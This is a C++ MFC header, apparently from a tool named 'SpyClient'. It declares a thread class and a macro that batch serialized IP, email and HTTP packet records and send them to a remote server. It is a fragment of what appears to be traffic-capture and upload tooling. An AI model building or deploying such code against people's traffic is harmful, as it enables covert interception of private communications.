#pragma once
#include "stdafx.h"
#include "SpyClient.h"
#include <string>
#include "ext_string.h"
#include "LogMod.h"
#include "snappy.h"
#include "ProtobufThread.h"
#include "AppConfig.h"


using namespace std;

#define IPTYPE 1
#define MAILTYPE 2
#define HTTPTYPE 3
#define AssemblePacket(vectorpacket,packettype)    while(!vectorpacket->empty())\
{ \
	vectorpacket->back().SerializeToString(&packetbuff); \
	vectorpacket->pop_back(); \
	send_length+=packetbuff.length()+3; \
	if(send_length>MAXSIZEDATA) \
	{ \
		SendDataToServer(sendbuff,packettype);\
		sendbuff.clear(); \
		send_length=packetbuff.length()+3; \
	} \
	sendbuff+=packetbuff; \
	sendbuff+="!!!"; \
} \
if(send_length) \
{ \
	SendDataToServer(sendbuff,packettype); \
	sendbuff.clear(); \
	send_length=0; \
} \
 

// SendDataThread

class SendDataThread : public CWinThread
{
	DECLARE_DYNCREATE(SendDataThread)

protected:
	SendDataThread();           // 动态创建所使用的受保护的构造函数
	virtual ~SendDataThread();
	void SendToServer(vector<IpPacket> *vectorip,vector<EmailPacket> *vectoremail,vector<HttpPacket> *vectorhttp,int packettype);
	void SendDataToServer(string sendtata,int sendtype);
	//void test(ext_string ext_test);
	bool ConnectToServer();
	
public:
	virtual BOOL InitInstance();
	virtual int ExitInstance();
	virtual void OnFinalRelease();

protected:
	DECLARE_MESSAGE_MAP()
	afx_msg void OnReceiveIPMessage(WPARAM wParam, LPARAM lParam);
	afx_msg void OnReceiveHttpMessage(WPARAM wParam, LPARAM lParam);
	afx_msg void OnReceiveEmailMessage(WPARAM wParam, LPARAM lParam);
	DECLARE_DISPATCH_MAP()
	DECLARE_INTERFACE_MAP()
private:
	CInternetSession* session;
	CHttpConnection* pConnection;
};


